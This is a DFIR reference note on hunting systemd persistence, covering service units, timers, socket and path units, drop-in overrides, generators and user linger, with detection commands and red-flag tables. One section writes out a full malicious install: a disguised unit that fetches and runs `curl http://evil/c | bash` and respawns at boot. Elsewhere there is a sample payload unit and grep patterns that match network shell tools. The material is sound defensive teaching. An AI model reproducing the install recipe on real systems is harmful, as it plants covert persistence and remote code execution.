# Systemd Units Timers and Generators

systemd is PID 1 on nearly every modern Linux host, and it's the dominant persistence surface — the modern equivalent of cron and init combined. A **service unit** runs a program at boot (or on demand); a **timer unit** schedules one like cron; a **generator** synthesizes units dynamically at every reload and is stealthy because it produces no static file you'd spot in the usual directories. Detection is about enumerating enabled units and timers, reading their `ExecStart` payloads, and knowing the difference between a system unit, a user unit, and a drop-in override.

> ℹ️ **Not every host runs systemd.** On Alpine/Gentoo (OpenRC), Void (runit), or legacy SysV, this whole note doesn't apply — pivot to **More Persistence → Non-systemd Init** for `/etc/local.d`, `/etc/sv`, `/etc/init.d`, and runlevel persistence.

> 🔴 Read `ExecStart` (and `ExecStartPre`/`ExecStartPost`), not just the unit name — the name is chosen to blend in (`apache-tune.service`), the payload is where the truth is. Check three often-missed spots: **user units** under `~/.config/systemd/user/` (no root needed to install), **drop-in overrides** (`*.service.d/*.conf`) that hijack a legit service, and **generators** that leave no static unit file.

## Contents

- [Quick Triage](#quick-triage)
- [What to Check for What](#what-to-check-for-what)
- [How the Persistence Works](#how-the-persistence-works)
- [Unit Types and Locations](#unit-types-and-locations)
- [Sample Malicious Unit](#sample-malicious-unit)
- [Key Directives](#key-directives)
- [Enumerating and Inspecting](#enumerating-and-inspecting)
- [Timers](#timers)
- [Socket and Path Activation](#socket-and-path-activation)
- [Drop-in Overrides and Masking](#drop-in-overrides-and-masking)
- [Generators](#generators)
- [User Linger](#user-linger)
- [Logs](#logs)
- [Deep Threat Hunts](#deep-threat-hunts)
- [Getting Max Value](#getting-max-value)
- [Correlate With](#correlate-with)
- [Scenarios](#scenarios)
- [Red Flags](#red-flags)

## Quick Triage

```bash
# Enabled units + all timers
systemctl list-unit-files --state=enabled

systemctl list-timers --all

# Every ExecStart payload across the unit dirs
grep -rEsH "ExecStart" /etc/systemd/system /usr/lib/systemd/system /run/systemd/system 2>/dev/null

# User-level units (per-user persistence)
ls -l /home/*/.config/systemd/user/*.{service,timer} 2>/dev/null

# Recently added/modified units
find /etc/systemd /usr/lib/systemd /run/systemd \( -name "*.service" -o -name "*.timer" \) -newermt "3 hours ago" -ls 2>/dev/null
```

## What to Check for What

| Investigative question | Command / filter |
|------------------------|------------------|
| Any suspicious `ExecStart` payload? | `grep -rEs ExecStart /etc/systemd/system … \| grep -Ei 'curl\|/dev/shm\|bash -c'` |
| Hand-dropped (unowned) unit? | `dpkg -S`/`rpm -qf` a unit in `/etc/systemd/system` → "not found" |
| Trusted unit hijacked via drop-in? | `cat /etc/systemd/system/*.service.d/*.conf` |
| Non-timer activation (socket/path)? | `systemctl list-units --type=socket,path`; `ListenStream`/`PathChanged` |
| Stealth generator (no static file)? | unowned file in `system-generators/` |
| User units running with no login? | `/var/lib/systemd/linger/` |
| `LD_PRELOAD` injected via unit env? | `grep -rEs 'Environment\|EnvironmentFile' … \| grep -i preload` |
| Security/logging unit disabled? | `systemctl list-unit-files --state=masked` |
| When was it activated? | `journalctl -u <unit>` |

## How the Persistence Works

The attacker drops a `.service` unit whose `ExecStart` runs their payload, enables it so it starts at boot, and optionally pairs it with a `.timer` for scheduled re-runs. The classic install:

```bash
# 1) Write a unit that runs the payload
cat > /etc/systemd/system/apache-tune.service <<'EOF'
[Unit]
Description=Apache performance tuning
[Service]
ExecStart=/bin/bash -c 'curl -s http://evil/c | bash'
Restart=always
[Install]
WantedBy=multi-user.target
EOF

# 2) Enable + start it (WantedBy links it into boot)
systemctl daemon-reload; systemctl enable --now apache-tune.service
```

🔴 `WantedBy=multi-user.target` wires it into the normal boot; `Restart=always` makes it respawn if killed (which is why you remove the unit *before* killing the process during eradication). A benign-sounding `Description` and name are chosen to survive a casual `systemctl list-units`.

## Unit Types and Locations

Precedence matters: `/etc/systemd/system` overrides `/usr/lib/systemd/system`, and `/run/systemd/system` is a volatile (RAM) location an attacker can use for reboot-limited persistence that leaves no disk file after a restart.

| Path | Scope | Notes |
|------|-------|-------|
| `/usr/lib/systemd/system/` | System (packaged) | Distro/vendor units; changes here should map to a package |
| 🔴 `/etc/systemd/system/` | System (admin) | Admin-created units — **prime persistence**, overrides `/usr/lib` |
| 🔴 `/run/systemd/system/` | System (volatile) | RAM-backed; vanishes on reboot (stealthy, transient) |
| 🔴 `~/.config/systemd/user/` | Per-user | User can install without root (`systemctl --user`) |
| `/etc/systemd/system/*.d/*.conf` | Drop-in override | Modifies an existing unit 🔴 |
| `/etc/systemd/system-generators/` | Generators | Scripts that synthesize units at reload 🔴 |

## Sample Malicious Unit

What a planted unit looks like, annotated:

```ini
[Unit]
Description=System Logging Helper        # innocuous name to blend in

[Service]
Type=simple
ExecStart=/bin/bash -c '/dev/shm/.s'     # 🔴 payload in a RAM-backed path
Restart=always                           # 🔴 respawns if killed
RestartSec=30

[Install]
WantedBy=multi-user.target               # 🔴 auto-starts at boot
```

Every 🔴 line is a signal: a payload path in `/dev/shm`/`/tmp`, a `Restart=` that fights eradication, and a `WantedBy` that wires it into boot.

## Key Directives

| Directive | DFIR relevance |
|-----------|----------------|
| 🔴 `ExecStart` / `ExecStartPre` / `ExecStartPost` | The payload — what actually runs |
| 🔴 `Restart=` | `always`/`on-failure` = resilient; respawns after a kill |
| 🔴 `WantedBy=` / `RequiredBy=` | Wires the unit into a boot target (auto-start) |
| `User=` / `Group=` | Run-as identity (a root unit is higher impact) |
| `Environment=` / `EnvironmentFile=` | Can smuggle `LD_PRELOAD` injection |
| `Type=` | `oneshot`/`forking`/`simple` — how it runs |
| `OnCalendar=` / `OnBootSec=` (timers) | The schedule |

## Enumerating and Inspecting

```bash
# Enabled units (the ones that auto-start)
systemctl list-unit-files --state=enabled

# Running services
systemctl list-units --type=service --state=running

# Dump one unit's full definition (resolves drop-ins)
systemctl cat apache-tune.service

# Show effective properties incl. the resolved ExecStart + owning cgroup
systemctl show apache-tune.service -p ExecStart -p FragmentPath -p DropInPaths

# All ExecStart lines across the dirs
grep -rEsH "ExecStart|ExecStartPre|ExecStartPost" /etc/systemd/system /usr/lib/systemd/system /run/systemd/system 2>/dev/null

# Map a unit file back to a package (unowned = hand-dropped)
dpkg -S /etc/systemd/system/apache-tune.service 2>/dev/null || rpm -qf /etc/systemd/system/apache-tune.service 2>/dev/null
```

🔴 A unit file **not owned by any package** (`dpkg -S`/`rpm -qf` say "not found") in `/etc/systemd/system` is hand-created — legitimate for admin scripts, but exactly what an attacker drops. Combine with `systemctl show ... -p FragmentPath` to see the real file behind a unit.

## Timers

Timers replace cron on systemd hosts. A `.timer` defines the schedule and triggers a same-named `.service` (unless `Unit=` overrides). Read both together.

```bash
# All timers with next/last run
systemctl list-timers --all

# A timer + the service it triggers
systemctl cat backup.timer backup.service

# User timers (per-user persistence)
ls -l /home/*/.config/systemd/user/*.timer 2>/dev/null
```

🔴 `OnCalendar=*:0/5` (every 5 min) or `OnBootSec=` on a timer whose service runs a temp-path payload is the systemd equivalent of a beaconing cron job.

## Socket and Path Activation

🔴 Beyond timers, systemd can trigger a service on an **event** — a network connection (`.socket`) or a filesystem change (`.path`). Neither requires the payload service to be "enabled," so a service/timer-only sweep misses them.

```bash
# Socket units (activate a service on connection to a port/socket)
systemctl list-units --type=socket

grep -rEsH 'ListenStream|ListenDatagram|Accept=' /etc/systemd/system /run/systemd/system 2>/dev/null

# Path units (activate a service when a file appears/changes)
systemctl list-units --type=path

grep -rEsH 'PathExists|PathChanged|PathModified|DirectoryNotEmpty' /etc/systemd/system /run/systemd/system 2>/dev/null
```

🔴 A `.socket` that spawns a shell on connection is a **backdoor listener**; a `.path` watching `/tmp` that runs a service when a file appears is a **dropper trigger**. Both fire without appearing in `list-timers` or as a running service.

## Drop-in Overrides and Masking

Rather than a new unit, an attacker can *modify* a trusted one via a drop-in, so a legitimate service now also runs their payload.

```bash
# Drop-in override fragments (these MODIFY existing units)
find /etc/systemd/system -path "*.d/*.conf" -ls 2>/dev/null

cat /etc/systemd/system/*.service.d/*.conf 2>/dev/null

# Masked units (attacker may mask a security service to disable it)
systemctl list-unit-files --state=masked
```

🔴 An `override.conf` adding an `ExecStartPost=` to a trusted service (e.g. `ssh.service`) hijacks that service's identity to run the payload. Masking a security/logging service (`auditd`, `falco`) is a defense-evasion tell.

## Generators

Generators are executables run at every `daemon-reload` that *synthesize* unit files into a volatile directory — so the persistence exists as a generator script, with no static unit in the usual places.

```bash
# Generator directories (rare - anything here deserves scrutiny)
ls -l /etc/systemd/system-generators/ /usr/lib/systemd/system-generators/ /run/systemd/generator* 2>/dev/null

# Read any non-packaged generator
for g in /etc/systemd/system-generators/* /usr/lib/systemd/system-generators/*; do
  dpkg -S "$g" >/dev/null 2>&1 || rpm -qf "$g" >/dev/null 2>&1 || echo "UNOWNED GENERATOR: $g"
done
```

🔴 An unowned generator is a stealthy, advanced persistence technique — it regenerates the attacker's units on every reload/boot, and the synthesized units live in `/run` (RAM), leaving little on disk.

## User Linger

🔴 Normally a user's `--user` units only run while they're logged in. **Lingering** (`loginctl enable-linger <user>`) starts a user's systemd instance at boot and keeps it running with **no login required** — so a per-user unit persists like a system one.

```bash
# Users with lingering enabled (their user units run without a session)
ls -la /var/lib/systemd/linger/ 2>/dev/null

# That user's units (the ones that will run via linger)
ls -l /home/*/.config/systemd/user/*.{service,timer} 2>/dev/null
```

A linger file for a service account, or for a user paired with a suspicious `~/.config/systemd/user/` unit, is persistence that survives logout and reboot without touching any system directory.

## Logs

```bash
# When a unit was started (marks activation of persistence)
journalctl -u apache-tune.service

# daemon-reload / re-exec (a new unit being loaded)
journalctl _COMM=systemd | grep -Ei "Reloading|Reexecuting|Started apache-tune"
```

## Deep Threat Hunts

The full systemd persistence surface — services, timers, sockets, paths, generators, linger. *(seasoned-DFIR)*

```bash
# 1. Every Exec* payload with a suspicious shape (system + user)
grep -rEsH 'ExecStart|ExecStartPre|ExecStartPost|ExecStop' \
  /etc/systemd/system /usr/lib/systemd/system /run/systemd/system /home/*/.config/systemd/user 2>/dev/null \
  | grep -Ei 'curl|wget|/tmp/|/dev/shm|bash -c|base64|/dev/tcp|nc '

# 2. Unowned units in /etc/systemd/system (hand-dropped)
for u in /etc/systemd/system/*.{service,timer,socket,path}; do
  [ -e "$u" ] || continue
  dpkg -S "$u" >/dev/null 2>&1 || rpm -qf "$u" >/dev/null 2>&1 || echo "UNOWNED: $u"
done

# 3. Socket + path activation (fires without an enabled service)
grep -rEsH 'ListenStream|ListenDatagram|PathExists|PathChanged|PathModified' /etc/systemd/system /run/systemd/system 2>/dev/null

# 4. Drop-in overrides hijacking a trusted unit, recently added
find /etc/systemd/system -path '*.d/*.conf' -newermt '-30 days' -ls 2>/dev/null

# 5. LD_PRELOAD smuggled via unit environment
grep -rEsH 'Environment=|EnvironmentFile=' /etc/systemd/system 2>/dev/null | grep -i preload

# 6. Lingering users + masked security units
ls -la /var/lib/systemd/linger/ 2>/dev/null

systemctl list-unit-files --state=masked

# 7. Unowned generators (regenerate units at every reload)
for g in /etc/systemd/system-generators/* /usr/lib/systemd/system-generators/*; do
  [ -e "$g" ] || continue; dpkg -S "$g" >/dev/null 2>&1 || rpm -qf "$g" >/dev/null 2>&1 || echo "UNOWNED GENERATOR: $g"
done

# 8. Recently added units of ANY activation type
find /etc/systemd /run/systemd -type f \( -name '*.service' -o -name '*.timer' -o -name '*.socket' -o -name '*.path' \) -newermt '-3 days' -ls 2>/dev/null
```

**Hunt ideas:**

- **Don't stop at `.service`/`.timer`** — `.socket` (activate on connection) and `.path` (activate on file event) are quieter persistence that fires without an "enabled" or "running" service.
- **Every unit in `/etc/systemd/system` should map to a package or a known admin action** — the *unowned* ones are your shortlist.
- **Linger (`/var/lib/systemd/linger`) lets a user's units run with the user never logged in** — an overlooked user-persistence enabler.
- **A drop-in `override.conf` hijacks a *trusted* unit's identity** — the malicious `ExecStartPost` rides `ssh.service`, not a new file.
- **`Environment=LD_PRELOAD=…` in a unit** injects into that service's process — persistence + rootkit in one directive.

## Getting Max Value

- **Read `ExecStart` (all `Exec*`), not the unit name** — the name blends in; use `systemctl cat`/`show -p FragmentPath -p DropInPaths` to resolve the real file + overrides.
- **Baseline-diff** the enabled units, timers, sockets, and paths against a golden host of the same build.
- **Cover every stealth tier** — generators (no static file), `/run` (RAM), user units, linger, drop-ins.
- **Package-map every unit** in `/etc/systemd/system`; unowned = hand-created.
- **`journalctl -u <unit>` dates the activation** for the timeline.

## Correlate With

| To answer… | Pivot to |
|------------|----------|
| On-disk unit/timer artifact collection | **Scheduled Tasks Spool and State** (08) |
| What the unit executed + its lineage | **Auditd**, **Systemd Journal** (`_SYSTEMD_UNIT`), **Process Trees** (10b) |
| `LD_PRELOAD` injected via a unit's env | **Preload Hijacking** |
| When the unit was activated | **Timelining** (13), `journalctl -u` |
| Verify a "packaged" unit wasn't trojaned | **Package Managers and Integrity** (08) |
| Remove it safely (unit before process; `Restart=always`) | **Remediation and Containment** (14) |

## Scenarios

- **Payload service:** `ExecStart` to `/dev/shm`, `Restart=always`, `WantedBy=multi-user.target` — resilient boot persistence.
- **Trusted-unit hijack:** an `override.conf` adds `ExecStartPost=` to `ssh.service`, so a legit service runs the payload.
- **Stealth generator:** an unowned generator regenerates the attacker's units into `/run` on every reload.
- **Event activation:** a `.socket` spawns a shell on connection, or a `.path` runs a service when a file lands in `/tmp`.
- **User linger:** `enable-linger` on a service account runs its `~/.config/systemd/user/` unit with no login.

## Red Flags

| 🔴 Finding | Likely meaning |
|-----------|----------------|
| `ExecStart` to `/tmp`/`/dev/shm` or `curl\|bash` | Payload service |
| Unit not owned by any package in `/etc/systemd/system` | Hand-dropped persistence |
| `Restart=always` + `WantedBy=multi-user.target` on an unknown unit | Resilient auto-start |
| `.timer` triggering a temp-path service | Scheduled beacon |
| Drop-in `override.conf` on a trusted service | Hijacked legit unit |
| Unowned generator in `system-generators/` | Stealthy regenerating persistence |
| Masked security/logging unit | Defense evasion |
| User unit in `~/.config/systemd/user/` | Per-user persistence (no root needed) |
| `.socket`/`.path` unit spawning a shell/service | Event-triggered backdoor / dropper |
| Linger file for a service account | User units run with no login |
| `Environment=LD_PRELOAD=` in a unit | Library-injection persistence |

## Resources

- `systemd.service(5)`, `systemd.timer(5)`, `systemd.socket(5)`, `systemd.path(5)`, `systemd.generator(7)`, `loginctl(1)`, `systemctl(1)` man pages
- MITRE ATT&CK: T1543.002 (Systemd Service), T1053.006 (Systemd Timers), T1546 (Event Triggered Execution)
